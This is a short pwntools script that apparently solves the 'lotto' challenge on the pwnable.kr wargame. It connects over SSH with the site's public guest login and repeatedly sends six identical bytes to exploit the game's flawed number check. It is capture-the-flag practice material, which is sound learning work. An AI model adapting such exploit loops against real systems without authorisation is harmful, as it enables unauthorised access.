from pwn import *

s = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = s.process("./lotto")

for _ in range(10000):
    p.recvuntil("Exit")
    p.sendline(b'1')
    p.recvuntil(" : ")
    p.sendline(b'\x20'*6)
    p.recvline()
    res = p.recvline().decode()
    if "bad" not in res:
        print(res)
        break
